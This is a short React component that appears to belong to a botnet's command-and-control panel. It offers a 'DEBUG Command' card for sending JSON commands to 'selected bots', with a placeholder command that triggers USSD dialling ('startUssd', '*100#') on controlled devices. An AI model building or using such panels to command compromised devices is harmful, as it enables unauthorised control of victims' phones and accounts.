import React from 'react';
import SettingsContext from '../../Settings';

class DebugCommand extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          DEBUG: ''
        }
    }

    onChangeDEBUG = (e) => {
        this.setState({ 
            DEBUG: e.target.value
        });
    }

    onClickDEBUG = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand(this.state.DEBUG);
            this.setState({ 
                DEBUG: ''
            });
            SettingsContext.ShowToastTitle("info", "DEBUG", "DEBUG SEND COMPLETE");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card" style={({backgroundColor: '#651a21'})}>
                <div class="card-body">
                    <h5 class="card-title">DEBUG Command</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Send command to selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.DEBUG} onChange={this.onChangeDEBUG} placeholder='{"name":"startUssd","ussd":"*100#"}' />
                    </p>
                    <button type="button" onClick={this.onClickDEBUG} class="btn btn-right btn-outline-success">Send debug message</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default DebugCommand;